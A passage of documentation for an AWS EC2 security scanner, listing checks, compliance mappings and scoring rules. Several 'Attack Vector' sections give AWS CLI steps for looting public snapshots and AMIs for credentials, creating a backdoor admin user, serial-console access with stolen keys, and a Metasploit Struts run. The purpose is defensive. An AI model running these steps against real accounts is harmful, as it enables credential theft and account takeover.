- **Function:** `check_ebs_default_encryption`
- **Description:** Account/region-level setting that forces every new EBS volume to be encrypted by default.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.7
- **CIS v5.0 Control:** 5.1.1
- **What's Checked:** `get_ebs_encryption_by_default()` → `EbsEncryptionByDefault == true`.

**Why This Check is Critical:**
Without default encryption, every new launch (and every Auto Scaling group, every CloudFormation/Terraform deploy) is at risk of producing an unencrypted volume because the launch parameter was forgotten. Default encryption is a one-toggle guarantee.

**Attack Vector When Check Fails:**
The same as C.1, but at fleet scale — every new volume created by every team in the account is potentially unencrypted.

---

### 3. EBS Snapshot Public Access

**Check Details:**
- **Function:** `check_ebs_snapshot_public`
- **Description:** EBS snapshots owned by the account must not be publicly restorable.
- **Severity:** CRITICAL
- **FSBP Control:** EC2.1
- **What's Checked:** For each owned snapshot, `describe_snapshot_attribute(Attribute='createVolumePermission')` must NOT contain `Group: all`.

**Why This Check is Critical:**
A public snapshot exposes the entire volume image — OS, application code, configuration files, embedded credentials, and any data — to every AWS account in the world. Public snapshots are routinely scraped by researchers and adversaries.

**Attack Vector When Check Fails:**

**Step 1: Discover Public Snapshots**
```bash
# Anyone can list public snapshots
aws ec2 describe-snapshots --restorable-by-user-ids all \
  --filters "Name=owner-id,Values=<victim_account>" \
  --query 'Snapshots[].[SnapshotId,Description,VolumeSize]'
```

**Step 2: Create a Volume from the Snapshot**
```bash
aws ec2 create-volume --snapshot-id snap-<victim> \
  --availability-zone us-east-1a --profile attacker
```

**Step 3: Mount and Loot**
```bash
# Attach to attacker's instance, mount, read filesystem at leisure
aws ec2 attach-volume --instance-id i-attacker --volume-id vol-new --device /dev/sdf
mount /dev/xvdf /mnt/loot
grep -r "AKIA\|password\|BEGIN PRIVATE KEY" /mnt/loot
```

---

### 4. EBS Backup Plan Coverage

**Check Details:**
- **Function:** `check_ebs_backup`
- **Description:** Each EBS volume should be covered by an AWS Backup plan. Uses `backup:describe_protected_resource` for an O(1) lookup per volume.
- **Severity:** LOW
- **FSBP Control:** EC2.28
- **What's Checked:** `describe_protected_resource(ResourceArn=<volume_arn>)` returns a `LastBackupTime`.

**Why This Check is Critical:**
Volumes outside a backup plan are vulnerable to ransomware, accidental deletion, and insider sabotage with no recovery option.

---

### 5. Launch Template EBS Encryption

**Check Details:**
- **Function:** `check_launch_template_ebs`
- **Description:** Launch template block device mappings should set `Encrypted=true`. Otherwise, every Auto Scaling group / fleet launch produces unencrypted volumes.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.181
- **What's Checked:** `LaunchTemplateData.BlockDeviceMappings[].Ebs.Encrypted == true` (when checked is true; only flagged when the template is in active use).

---

### 6. Public AMI Sharing

**Check Details:**
- **Function:** `check_public_ami`
- **Description:** Account-owned AMIs should not be public. Public AMIs leak the full disk image: OS, applications, configuration, and frequently embedded secrets.
- **Severity:** CRITICAL
- **What's Checked:** `describe_images(Owners=['self'])` → every image has `Public == false`.

**Why This Check is Critical:**
A public AMI is functionally identical to a public snapshot but with even more "polish" for the attacker — it's a launch-ready image with the operating system, the app, and the configuration baked in. Discoverable via `describe-images --executable-users all`.

**Attack Vector When Check Fails:**

**Step 1: Discover Public AMIs**
```bash
aws ec2 describe-images --executable-users all \
  --filters "Name=owner-id,Values=<victim>" \
  --query 'Images[].[ImageId,Name,Description]'
```

**Step 2: Launch the AMI in Attacker Account**
```bash
aws ec2 run-instances --image-id ami-<victim> --instance-type t3.micro \
  --key-name attacker-key --profile attacker
```

**Step 3: Read Filesystem and Embedded Secrets**
```bash
ssh -i attacker-key.pem ec2-user@<attacker_instance>
grep -r "AKIA\|password" /etc /opt /home
cat /var/log/cloud-init-output.log   # Often contains secrets
```

---

### 7. EBS Snapshot Block Public Access

**Check Details:**
- **Function:** `check_ebs_snapshot_bpa`
- **Description:** EBS Snapshot Block Public Access (account/region setting) should be set to `block-all-sharing`. This is the snapshot equivalent of S3 BPA — a single switch that prevents *any* snapshot in the region from being made public, regardless of per-snapshot settings.
- **Severity:** HIGH
- **FSBP Control:** EC2.182
- **What's Checked:** `get_snapshot_block_public_access_state()` returns `block-all-sharing` or `block-new-sharing`.

**Why This Check is Critical:**
C.3 is per-snapshot detective control. C.7 is the account-wide preventive control. Even if every team in the account makes a mistake, BPA blocks the public exposure.

**Attack Vector When Check Fails:**
Same as C.3 — but without BPA, the door is permanently held open for any future snapshot to leak.

---

## D. Access Control

### 1. IAM Role Least Privilege

**Check Details:**
- **Function:** `check_iam_role`
- **Description:** Inspects the IAM role attached to the instance for overly permissive policies. Flags `AdministratorAccess`, `*:*` actions on `*` resources, and service-level wildcards (`ec2:*` on `*`).
- **Severity:** HIGH
- **What's Checked:**
  - Managed policy: `AdministratorAccess`
  - Customer-managed policies and inline policies with `Action: "*"` on `Resource: "*"`
  - Service-level wildcards (`s3:*`, `iam:*`, `ec2:*`) on `Resource: "*"`
  - Result fields: `has_admin_access`, `has_wildcard_actions`

**Why This Check is Critical:**
The single most damaging IMDSv1/SSRF outcome (see check #1) is that the stolen credentials carry whatever permissions the instance role has. A role with `AdministratorAccess` means full account compromise on first hop. A role scoped to `s3:GetObject` on one prefix means the blast radius is bounded to that prefix.

**Attack Vector When Check Fails:**

**Step 1: Steal IMDS Credentials (See Check #1)**

**Step 2: Discover Permissions**
```bash
aws iam get-role --role-name <stolen-role>
aws iam list-attached-role-policies --role-name <stolen-role>
aws iam list-role-policies --role-name <stolen-role>
```

**Step 3: Escalate**
```bash
# If AdministratorAccess: full account takeover
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
```

---

### 2. Serial Console Access Disabled

**Check Details:**
- **Function:** `check_serial_console`
- **Description:** Account-level EC2 Serial Console access should be disabled unless explicitly needed for OS recovery.
- **Severity:** MEDIUM
- **What's Checked:** `get_serial_console_access_status()` → `SerialConsoleAccessEnabled == false`.

**Why This Check is Critical:**
Serial console access bypasses SSH and grants OS-level access to anyone with the right IAM permission, regardless of the instance's network position. It is intended as a break-glass; a compromised IAM identity with `ec2-instance-connect:SendSerialConsoleSSHPublicKey` can land directly on any instance.

**Attack Vector When Check Fails:**

**Step 1: Use Stolen IAM Credentials**
```bash
aws ec2-instance-connect send-serial-console-ssh-public-key \
  --instance-id i-<target> \
  --serial-port 0 \
  --ssh-public-key file://attacker.pub
ssh -i attacker.key i-<target>.<region>.serial-console.ec2-instance-connect.aws
```

---

### 3. EC2 Instance Connect Endpoints Configured

**Check Details:**
- **Function:** `check_instance_connect`
- **Description:** Verifies whether VPC EC2 Instance Connect Endpoints (EICE) are configured. EICE allows SSH/RDP without public IPs and without bastion hosts, with full IAM authentication and CloudTrail logging.
- **Severity:** LOW (informational)
- **What's Checked:** `describe_instance_connect_endpoints()` returns at least one endpoint per VPC where instances live.

**Why This Check is Critical:**
EICE is the modern alternative to: (a) public IP + open SSH SG, (b) bastion hosts, (c) Direct SSM Session Manager (which is also fine). When EICE is in place there's no reason to expose port 22.

---

## E. Logging & Monitoring

### 1. CloudTrail Enabled

**Check Details:**
- **Function:** `check_cloudtrail`
- **Description:** CloudTrail should be enabled and actively capturing EC2 management events. Verifies multi-region trails and `get_event_selectors` for management event coverage.
- **Severity:** HIGH
- **What's Checked:**
  - `describe_trails(includeShadowTrails=False)` returns at least one trail
  - `get_trail_status(Name=<trail>)` shows `IsLogging == true`
  - `get_event_selectors(TrailName=<trail>)` shows management events captured

**Why This Check is Critical:**
Without CloudTrail, incident response cannot answer "who did what" in the AWS API. Every AWS-side action — `CreateUser`, `RunInstances`, `ModifySnapshotAttribute` — is invisible. CIS, SOC 2, HIPAA, PCI all require it.

**Attack Vector When Check Fails:**

**Step 1: Silent Account Modification**
```bash
# After compromising any IAM principal, attacker performs every action
# without leaving an audit record
aws iam create-user --user-name backdoor
aws ec2 modify-snapshot-attribute --snapshot-id snap-x \
  --create-volume-permission "Add=[{Group=all}]"
# No CloudTrail = no evidence
```

---

### 2. CloudWatch Alarms

**Check Details:**
- **Function:** `check_cloudwatch_alarms`
- **Description:** Each EC2 instance should have at least one CloudWatch alarm associated (status check, CPU, etc.).
- **Severity:** MEDIUM
- **What's Checked:** `describe_alarms` paginated, filtered to dimensions including the instance ID.

**Why This Check is Critical:**
Alarms are the proactive layer above logs — the thing that wakes up an on-call engineer when something is wrong. An instance with zero alarms is operationally invisible until it fails or until a customer complains.

---

### 3. SSM Inventory Managed

**Check Details:**
- **Function:** `check_ssm_managed`
- **Description:** Instance should be registered with AWS Systems Manager (SSM agent active and reachable). SSM is the foundation for patch compliance, inventory, configuration management, and Session Manager.
- **Severity:** MEDIUM
- **What's Checked:** `ssm:describe_instance_information` returns the instance with `PingStatus == "Online"`.

**Why This Check is Critical:**
An unmanaged instance is dark. There is no patch state, no inventory, no Session Manager fallback if SSH breaks, no automated remediation. It is also a strong indicator of "shadow IT" / forgotten infrastructure.

---

### 4. GuardDuty Enabled (Runtime Monitoring + EC2 Agent)

**Check Details:**
- **Function:** `check_guardduty`
- **Description:** Amazon GuardDuty should be enabled with EC2 Runtime Monitoring and the EC2 agent management sub-feature.
- **Severity:** HIGH
- **What's Checked:**
  - `list_detectors()` returns at least one detector
  - `get_detector(DetectorId=<id>)` shows `Features[?Name=='RUNTIME_MONITORING'].Status == 'ENABLED'`
  - For Runtime Monitoring, the `EC2_AGENT_MANAGEMENT` additional configuration is `ENABLED`

**Why This Check is Critical:**
GuardDuty Runtime Monitoring detects in-instance threats: cryptominer execution, reverse shells, suspicious process trees, credential file access, container escapes. The traditional GuardDuty (DNS/VPC flow analysis) is purely network-based and misses on-host threats.

**Attack Vector When Check Fails:**
- Cryptojacking runs undetected for months
- Reverse shells go unnoticed
- Suspicious process behavior not alerted on

---

## F. Patch & Vulnerability Management

### 1. SSM Patch Compliance

**Check Details:**
- **Function:** `check_ssm_patch_compliance`
- **Description:** SSM-managed instances should report compliant patch state. Non-compliant means missing or failed patches.
- **Severity:** HIGH
- **What's Checked:** `ssm:describe_instance_patch_states(InstanceIds=[<id>])` → `MissingCount == 0` and `FailedCount == 0`.

**Why This Check is Critical:**
Unpatched OS and library vulnerabilities are the single largest cause of breached EC2 instances after misconfigured SGs. CVE-2021-44228 (Log4Shell), CVE-2014-0160 (Heartbleed), CVE-2017-5638 (Struts → Equifax), CVE-2021-26855 (ProxyLogon) — every one of these was preventable with timely patching.

**Attack Vector When Check Fails:**

**Step 1: Discover Vulnerable Service**
```bash
nmap -sV <target>
# OpenSSH 7.4, Apache 2.4.6, Tomcat 8.5.16 — all years out of date
```

**Step 2: Exploit Known CVE**
```bash
# Public exploit code on Exploit-DB / Metasploit
msfconsole -q -x "use exploit/linux/http/struts2_content_type_ognl; set RHOST <target>; run"
```

---

### 2. AMI Age (Staleness)

**Check Details:**
- **Function:** `check_ami_age`
- **Description:** Instances should not run on AMIs older than a configurable threshold (default: 180 days). Old AMIs accumulate unpatched vulnerabilities.
- **Severity:** MEDIUM
- **What's Checked:** `describe_images(ImageIds=[<ami>])` → `(today - CreationDate) <= threshold_days`.

**Why This Check is Critical:**
Even with patch management, instances launched from a 2-year-old AMI start with hundreds of accumulated vulnerabilities. They have a brief but exploitable window before patches catch up. AMI baking should be on a regular cadence.

---

### 3. Inspector v2 EC2 Scanning

**Check Details:**
- **Function:** `check_inspector` (in patch_vulnerability)
- **Description:** Amazon Inspector v2 (the current service — Inspector Classic is deprecated) should be enabled with EC2 scanning active. The instance should have coverage and zero CRITICAL/HIGH findings.
- **Severity:** HIGH
- **What's Checked:**
  - `inspector2:batch_get_account_status()` → `accounts[].resourceState.ec2.status == "ENABLED"`
  - `inspector2:list_coverage(filterCriteria={...resourceType:AWS_EC2_INSTANCE...})` → instance covered
  - `inspector2:list_findings(filterCriteria={...severity:CRITICAL/HIGH...})` → zero findings

**Why This Check is Critical:**
Inspector v2 continuously scans for OS and language-package CVEs without requiring you to deploy your own scanner. It cross-references against the NVD and rescans on package install / patch / new CVE publication. CRITICAL/HIGH findings represent known-exploitable vulnerabilities in the running instance.

---

## G. Network Exposure

### 1. Unused Elastic IPs

**Check Details:**
- **Function:** `check_unused_eips`
- **Description:** Elastic IPs not associated with any instance or ENI.
- **Severity:** LOW
- **FSBP Control:** EC2.12
- **What's Checked:** `describe_addresses()` → `AssociationId` is empty.

**Why This Check is Critical:**
Beyond cost (~$3.60/mo per dangling EIP), unused EIPs indicate decommissioned infrastructure that may still have DNS records pointing at it. If the EIP is released, the next user of that public IP inherits the residual reputation, traffic, and any DNS records still pointing at it (the "dangling DNS" / IP squatting class of attack).

---

### 2. Launch Template Public IP Assignment

**Check Details:**
- **Function:** `check_launch_template_public_ip`
- **Description:** Launch templates should not assign public IPs. Otherwise every Auto Scaling launch gets a public IP regardless of subnet settings.
- **Severity:** HIGH
- **FSBP Control:** EC2.25
- **What's Checked:** `LaunchTemplateData.NetworkInterfaces[].AssociatePublicIpAddress == false`.

---

### 3. Default Security Group

**Check Details:**
- **Function:** `check_default_sg`
- **Description:** Every VPC's default security group should allow no inbound or outbound traffic. Resources should use custom SGs.
- **Severity:** HIGH
- **FSBP Control:** EC2.2
- **CIS v5.0 Control:** 5.5
- **What's Checked:** Default SG (`group-name=default`) has empty `IpPermissions` and empty `IpPermissionsEgress`.

**Why This Check is Critical:**
The default SG is created with permissive intra-SG rules. Any instance that gets attached to it inherits that permissiveness. Locking down the default SG ensures that "I forgot to specify an SG" results in a non-functional instance, not an over-exposed one.

---

## H. Tagging & Inventory

### 1. Required Tags

**Check Details:**
- **Function:** `check_required_tags`
- **Description:** EC2 instances, security groups, and volumes should have the configured set of required tag keys (default: `Name`, `Environment`, `Owner`, `CostCenter`).
- **Severity:** LOW
- **FSBP Controls:** EC2.38 (instances), EC2.43 (SGs), EC2.45 (volumes)
- **What's Checked:** Required tag keys are present on instances, SGs, and volumes.

**Why This Check is Critical:**
Without tags, the security team cannot answer "who owns this?", "what environment is this?", or "what is the blast radius if this is breached?". Tagging is foundational to incident response, cost allocation, and policy automation (e.g., SCPs that gate operations on tag values).

> **Note:** FSBP defines 20+ additional tagging controls (EC2.33–EC2.52, EC2.174–EC2.179) for various other EC2 resources. They are intentionally excluded from this scanner as LOW-severity controls best handled by AWS Config rules; we focus on the three highest-leverage tag checks (instances, SGs, volumes).

### 2. Stopped Instance Cleanup

**Check Details:**
- **Function:** `check_stopped_instance`
- **Description:** Stopped EC2 instances should be terminated after a configurable threshold (default: 30 days). Stopped instances continue to incur EBS cost, retain attached resources, and represent forgotten attack surface that can be unilaterally restarted.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.4
- **What's Checked:** Instance state `stopped` with `StateTransitionReason` timestamp older than threshold.

**Why This Check is Critical:**
A stopped-but-not-terminated instance can be started by anyone with `ec2:StartInstances`. Its attached EBS volumes still hold data. Its IAM instance profile still has its permissions. It is an asset that has fallen out of operational awareness while remaining live.

---

## Compliance Framework Mapping

The scanner evaluates 137 controls across 10 compliance frameworks. The mappings below come directly from `ec2_security_scanner/compliance.py`, which is the source of truth.

### AWS Foundational Security Best Practices (FSBP)

| Control ID | Description | Scanner Check | Severity |
|------------|-------------|---------------|----------|
| EC2.1 | EBS snapshots should not be publicly restorable | C.3 | CRITICAL |
| EC2.2 | VPC default SG should not allow inbound/outbound traffic | G.3 | HIGH |
| EC2.3 | Attached EBS volumes should be encrypted | C.1 | MEDIUM |
| EC2.4 | Stopped instances should be removed after threshold | H.2 | MEDIUM |
| EC2.6 | VPC flow logging should be enabled | B.1 | MEDIUM |
| EC2.7 | EBS default encryption should be enabled | C.2 | MEDIUM |
| EC2.8 | EC2 instances should use IMDSv2 | A.1 | HIGH |
| EC2.9 | EC2 instances should not have public IPv4 | A.2 | HIGH |
| EC2.12 | Unused EIPs should be removed | G.1 | LOW |
| EC2.13 | SGs should not allow ingress from 0.0.0.0/0 to port 22 | B.2 | HIGH |
| EC2.14 | SGs should not allow ingress from 0.0.0.0/0 to port 3389 | B.3 | HIGH |
| EC2.15 | Subnets should not auto-assign public IPs | B.10 | MEDIUM |
| EC2.17 | EC2 instances should not use multiple ENIs | A.6 | LOW |
| EC2.18 | SGs should only allow authorized ports open to world | B.7 | HIGH |
| EC2.19 | SGs should not allow unrestricted access to high-risk ports | B.4 | CRITICAL |
| EC2.21 | NACLs should not allow ingress from 0.0.0.0/0 to admin ports | B.8 | MEDIUM |
| EC2.22 | Unused SGs should be removed | G.4 | MEDIUM |
| EC2.23 | Transit Gateways should not auto-accept VPC attachments | B.12 | HIGH |
| EC2.24 | Paravirtual instance types should not be used | A.5 | MEDIUM |
| EC2.25 | Launch templates should not assign public IPs | G.2 | HIGH |
| EC2.28 | EBS volumes should be covered by backup plan | C.4 | LOW |
| EC2.38 | EC2 instances should have required tags | H.1 | LOW |
| EC2.53 | SGs should not allow ingress from 0.0.0.0/0 to remote admin ports (IPv4) | B.5 | HIGH |
| EC2.170 | Launch templates should enforce IMDSv2 | (LT-IMDSv2) | HIGH |
| EC2.172 | VPC Block Public Access should block IGW traffic | B.11 | HIGH |
| EC2.180 | EC2 network interfaces should have source/dest check enabled | B.9 | MEDIUM |
| EC2.181 | Launch template EBS volumes should be encrypted | C.5 | MEDIUM |
| EC2.182 | Block public access should be enabled for EBS snapshots | C.7 | HIGH |
| EC2.183 | EC2 VPN connections should use IKEv2 protocol | B.13 | HIGH |
| BP.UserData | No secrets/credentials in UserData | A.4 | CRITICAL |
| BP.Egress | SG egress should be restricted (opinionated; AWS default is allow-all, not FSBP-required) | B.6 | LOW |
| BP.PublicAMI | No public AMI sharing | C.6 | CRITICAL |

### CIS AWS Foundations Benchmark v5.0

| Control ID | Description | Scanner Check | Severity |
|------------|-------------|---------------|----------|
| 3.7 | Ensure VPC flow logging is enabled in all VPCs | B.1 | MEDIUM |
| 5.1.1 | Ensure EBS volume encryption is enabled by default | C.2 | MEDIUM |
| 5.2 | Ensure NACLs do not allow ingress from 0.0.0.0/0 to admin ports | B.8 | MEDIUM |
| 5.3 | Ensure no SGs allow ingress from 0.0.0.0/0 to remote admin ports | B.5 | HIGH |
| 5.4 | Ensure no SGs allow ingress from ::/0 to remote admin ports | B.5 | HIGH |
| 5.5 | Ensure the default SG restricts all traffic | G.3 | HIGH |
| 5.6 | Ensure EC2 launch templates enforce IMDSv2 | (LT-IMDSv2) | HIGH |
| 5.7 | Ensure EC2 instances use IMDSv2 | A.1 | HIGH |

### PCI DSS v4.0.1

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| 1.2.1 | Network security controls — SG and NACL restrictions | G.3, B.2, B.3, B.4, B.7 | HIGH |
| 1.3.1 | Restrict inbound traffic — no public IP | A.2, G.2, B.10 | HIGH |
| 1.3.2 | Restrict outbound traffic from CDE | B.6, B.4, B.5 | HIGH |
| 2.2.1 | System configuration standards — IMDSv2, HVM | A.1, A.5 | MEDIUM |
| 2.2.7 | No hardcoded secrets in UserData | A.4 | CRITICAL |
| 3.4.1 | Render PAN unreadable — EBS encryption | C.1, C.2, C.5 | HIGH |
| 6.3.3 | Security patches installed timely | F.1, F.2 | HIGH |
| 7.2.1 | Restrict access by business need — IAM least privilege | D.1, A.3 | HIGH |
| 8.6.1 | Management of system accounts — no shared credentials | A.4, D.1 | HIGH |
| 10.2.1 | Audit log implementation | E.1, B.1 | HIGH |
| 11.3.1 | Internal vulnerability scans — Inspector v2 | F.3 | HIGH |
| 11.5.1 | Intrusion detection — Inspector v2 and SSM | F.3, E.3 | HIGH |

### HIPAA Security Rule

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| 164.312(a)(1) | Access Control — unique user ID, role-based access | D.1, A.3, A.1 | HIGH |
| 164.312(a)(2)(iv) | Encryption of ePHI — EBS encryption | C.1, C.2, C.5 | HIGH |
| 164.312(b) | Audit Controls — audit mechanisms | E.1, B.1 | HIGH |
| 164.312(c)(1) | Integrity — protect ePHI from improper alteration | F.1, F.2, B.9 | MEDIUM |
| 164.312(d) | Authentication — verify identity | A.1 | HIGH |
| 164.312(e)(1) | Transmission Security — guard against unauthorized access | B.1, B.4 | HIGH |
| 164.312(e)(2)(ii) | Encryption in Transit — SG egress control | B.6, B.4 | MEDIUM |
| 164.308(a)(1) | Security Management — risk analysis | F.3, E.4 | HIGH |
| 164.308(a)(6) | Security Incident Procedures — response and reporting | E.4, F.3 | HIGH |
| 164.310(d)(1) | Device and Media — ePHI not public | C.3, C.6 | CRITICAL |

### SOC 2 Trust Service Criteria

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| CC6.1 | Logical Access Security | D.1, A.1, A.3, A.4 | HIGH |
| CC6.2 | User Credential Management | D.2, A.8 | MEDIUM |
| CC6.3 | Access Authorization | D.1, G.3, B.7 | HIGH |
| CC6.6 | Security Against External Threats | B.2, B.3, B.4, B.5 | HIGH |
| CC6.7 | Restrict Data Movement | A.2, B.6, G.2, B.10, B.11, B.12 | HIGH |
| CC6.8 | Prevent/Detect Unauthorized Software | F.1, F.2, E.3 | MEDIUM |
| CC7.1 | Detect and Monitor Anomalies | E.1, E.2, E.4, B.1 | HIGH |
| CC7.2 | Monitor System Components | E.3, A.7, F.3 | MEDIUM |
| CC7.3 | Evaluate Identified Events | E.4, F.3 | HIGH |
| CC8.1 | Change Management | (LT-IMDSv2), C.5, G.2 | MEDIUM |
| A1.2 | Environmental Protections (Availability) | C.4 | MEDIUM |
| C1.1 | Confidentiality of Information | C.1, C.2, C.3, C.6 | HIGH |
| P6.1 | Privacy Criteria — encryption of PII | C.1, H.1 | MEDIUM |

### ISO 27001:2022

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| A.5.15 | Access Control | D.1, A.3, A.1 | HIGH |
| A.5.18 | Access Rights — least privilege | D.1 | HIGH |
| A.8.1 | User Endpoint Devices | A.1, A.5, A.7 | MEDIUM |
| A.8.5 | Secure Authentication | A.1 | HIGH |
| A.8.9 | Configuration Management | E.3, (LT-IMDSv2), C.5 | MEDIUM |
| A.8.10 | Information Deletion | H.2, C.3 | MEDIUM |
| A.8.11 | Data Masking — no secrets in UserData | A.4 | CRITICAL |
| A.8.12 | Data Leakage Prevention | C.1, C.3, C.6, B.6 | HIGH |
| A.8.15 | Logging | E.1, B.1 | MEDIUM |
| A.8.16 | Monitoring Activities | E.4, E.3 | HIGH |
| A.8.20 | Network Security | G.3, B.2, B.3 | HIGH |
| A.8.21 | Security of Network Services | B.4, B.5, B.7 | HIGH |
| A.8.22 | Segregation of Networks | A.2, G.2, B.10, B.11, B.12 | HIGH |
| A.8.24 | Use of Cryptography | C.1, C.2 | HIGH |
| A.8.25 | SDLC Security | F.2, (LT-IMDSv2) | MEDIUM |
| A.8.26 | Application Security Requirements | A.1, B.9 | MEDIUM |
| A.8.28 | Secure Coding — patch compliance | F.1, F.3 | HIGH |

### ISO 27017:2015 (Cloud-Specific)

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| CLD.6.3.1 | Shared Responsibility — customer-managed IAM | D.1, A.3 | HIGH |
| CLD.8.1.5 | Removal of Cloud Assets | H.2, G.1, G.4 | MEDIUM |
| CLD.9.5.1 | Virtual Computing Segregation | G.3, A.2, B.10 | HIGH |
| CLD.9.5.2 | Virtual Machine Hardening | A.1, A.5, F.1 | HIGH |
| CLD.12.1.5 | Administrator Operational Security | D.1, D.2, E.1 | HIGH |
| CLD.12.4.5 | Monitoring of Cloud Services | E.2, E.4, A.7 | MEDIUM |
| CLD.13.1.4 | Virtual Network Security | G.3, B.2, B.3, B.1 | HIGH |

### ISO 27018:2019 (PII in Cloud)

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| A.10.6 | Encryption of PII | C.1, C.2, C.5 | HIGH |
| A.10.13 | Secure Disposal | H.2, C.3 | MEDIUM |
| A.11.1 | Data Minimization | H.1, H.2 | MEDIUM |
| A.12.4 | Audit Logging | E.1, B.1 | HIGH |

### GDPR (EU) 2016/679

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| Art.25 | Data Protection by Design | A.1, C.1, C.2, G.3 | HIGH |
| Art.32(1)(a) | Pseudonymisation & Encryption | C.1, C.2 | HIGH |
| Art.32(1)(b) | Confidentiality & Integrity | D.1, G.3, B.4, B.5, A.4, C.6 | HIGH |
| Art.32(1)(c) | Availability & Resilience | C.4, A.7, E.2 | MEDIUM |
| Art.32(1)(d) | Testing & Evaluation | F.3, E.4, F.1 | HIGH |
| Art.33 | Breach Notification | E.1, E.4 | HIGH |
| Art.44-49 | International Transfers — data governance tagging (note: tags support data governance but do NOT replace required legal transfer mechanisms such as SCCs, BCRs, or adequacy decisions) | H.1 | MEDIUM |
| Art.5(1)(f) | Integrity & Confidentiality | C.1, D.1, B.4 | HIGH |

### NIST SP 800-53 Rev5

| Control ID | Description | Scanner Checks | Severity |
|------------|-------------|----------------|----------|
| AC-2 | Account Management | D.1, A.3, A.4 | HIGH |
| AC-3 | Access Enforcement | D.1, G.3, B.7 | HIGH |
| AC-4 | Information Flow Enforcement | B.2, B.3, B.4, B.8, B.6 | HIGH |
| AC-4(21) | Physical/Logical Separation | A.2, B.10, B.11, B.12 | HIGH |
| AC-6 | Least Privilege | D.1 | HIGH |
| AC-17 | Remote Access | B.2, B.3, B.5, A.8, D.3 | HIGH |
| AU-2 | Event Logging | E.1, B.1 | MEDIUM |
| AU-3 | Content of Audit Records | E.1 | MEDIUM |
| AU-6 | Audit Review | E.4, F.3 | MEDIUM |
| AU-12 | Audit Record Generation | E.1, B.1 | MEDIUM |
| CA-7 | Continuous Monitoring | E.4, F.3, E.3 | HIGH |
| CM-2 | Baseline Configuration | E.3 | MEDIUM |
| CM-6 | Configuration Settings | A.1, A.5, G.3 | MEDIUM |
| CM-7 | Least Functionality | B.4, G.4, G.1 | MEDIUM |
| CP-9 | System Backup | C.4 | MEDIUM |
| IA-2 | Identification and Authentication | A.1 | HIGH |
| IA-5 | Authenticator Management | A.4 | HIGH |
| IR-4 | Incident Handling | E.4, F.3 | HIGH |
| MP-6 | Media Sanitization | H.2, C.3, C.6 | MEDIUM |
| RA-5 | Vulnerability Monitoring | F.1, F.2, F.3 | HIGH |
| SC-7 | Boundary Protection | B.2, B.3, B.4, B.8, B.6, B.11 | HIGH |
| SC-8 | Transmission Confidentiality | B.4, B.6, B.1 | MEDIUM |
| SC-13 | Cryptographic Protection | C.1, C.2, C.5 | HIGH |
| SC-28 | Protection of Information at Rest | C.1 | HIGH |
| SI-2 | Flaw Remediation | F.1, F.2 | HIGH |
| SI-4 | System Monitoring | E.2, E.4, A.7 | MEDIUM |
| SI-7 | Software Integrity | F.1 | MEDIUM |

---

## Security Scoring

The scanner produces **two independent scores** so that account/region-wide
posture is not multiplied across every instance:

- **Instance Score** — per-instance, instance-specific findings only.
- **Environment Score** — account/VPC-wide findings, scored **once** per scan.

**Non-stacking rule:** All security-group **ingress exposure** checks (B.2 SSH,
B.3 RDP, B.4 high-risk ports, B.5 remote admin, B.10 unauthorized ports) describe
the same underlying "ports open to 0.0.0.0/0" misconfiguration, so only the
**highest single SG penalty** is applied — never the sum.

### Instance Score (0–100)

Each instance starts at **100 points**; the score is clamped to a minimum of 0.

| Finding | Deduction | Severity |
|---------|-----------|----------|
| Exposed secrets in UserData | -25 | CRITICAL |
| Public EBS snapshots (of this instance's volumes) | -20 | CRITICAL |
| Security group open high-risk ports (0.0.0.0/0) | -20 | CRITICAL |
| No IMDSv2 enforcement | -15 | HIGH |
| Public IPv4 address | -15 | HIGH |
| Security group open SSH (0.0.0.0/0) | -15 | HIGH |
| Security group open RDP (0.0.0.0/0) | -15 | HIGH |
| IAM role with admin/wildcard access | -15 | HIGH |
| SG allows unauthorized open ports (not 80/443) | -10 | HIGH |
| Launch template IMDSv2 not enforced | -10 | HIGH |
| Launch template assigns public IP | -10 | HIGH |
| No EBS volume encryption | -10 | MEDIUM |
| SSM patch non-compliance | -10 | MEDIUM |
| No IAM instance profile | -8 | MEDIUM |
| Inspector v2 disabled or CRITICAL/HIGH findings | -8 | HIGH |
| Launch template EBS unencrypted | -5 | MEDIUM |
| Source/dest check disabled | -5 | MEDIUM |
| Not SSM managed | -5 | MEDIUM |
| Subnet auto-assigns public IP | -5 | MEDIUM |
| No CloudWatch alarms | -5 | MEDIUM |
| AMI older than 180 days | -5 | MEDIUM |
| No detailed monitoring | -5 | MEDIUM |
| Paravirtual instance type | -5 | MEDIUM |
| Key pair without SSM management | -5 | MEDIUM |
| Multiple ENIs | -3 | LOW |
| No EBS backup plan | -3 | LOW |
| Unrestricted SG egress (opinionated — AWS default, not FSBP-required) | -2 | LOW |
| Missing required tags | -2 | LOW |
| Stopped instance exceeds threshold | -2 | LOW |
| IMDSv2 hop limit > 2 | -2 | LOW |

### Environment Score (0–100)

Account/VPC-wide posture, scored once. VPC-level findings are counted once even
when several VPCs are affected.

| Finding | Deduction | Severity | Scope |
|---------|-----------|----------|-------|
| Public AMI sharing | -20 | CRITICAL | account |
| Default SG allows traffic | -10 | HIGH | per-VPC |
| EBS Snapshot BPA disabled | -10 | HIGH | account |
| Transit Gateway auto-accept enabled | -10 | HIGH | account |
| No GuardDuty protection | -10 | HIGH | account |
| VPC Block Public Access not enabled | -10 | HIGH | account |
| No CloudTrail trail | -10 | HIGH | account |
| VPN tunnel using IKEv1 | -10 | HIGH | account |
| No VPC flow logs | -10 | MEDIUM | per-VPC |
| EBS default encryption disabled | -5 | MEDIUM | account |
| Serial console access enabled | -5 | MEDIUM | account |
| NACL allows admin ports (0.0.0.0/0) | -5 | MEDIUM | per-VPC |
| Unused security groups | -2 | MEDIUM | account |
| Unused EIPs | -2 | LOW | account |
